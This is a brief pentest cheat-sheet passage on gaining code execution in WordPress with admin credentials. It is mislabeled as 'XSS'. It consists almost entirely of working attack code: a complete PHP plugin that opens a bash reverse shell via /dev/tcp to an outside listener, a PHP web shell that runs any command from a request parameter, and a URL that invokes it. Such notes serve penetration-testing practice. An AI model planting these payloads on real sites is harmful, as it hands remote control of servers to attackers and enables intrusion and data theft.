Some useful XSS for Wordpress content:\

If you have admin credentials to the wordpress CMS you can craft a plugin containing the reverse shell one liner. Set up the listener and 'Activate plugin' in Wordpress to initiate the reverse shell.

```php
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Kimi
* Author URI: http://www.nowhere.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.0.1/9999 0>&1'");
?>
```

You can also edit existing theme files and upload a web-shell:

```php
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```

After that navigate to the theme URL page:

```
http://somesite.com/wp-content/THEME_NAME/FILE_NAME.php?cmd=whoami
```
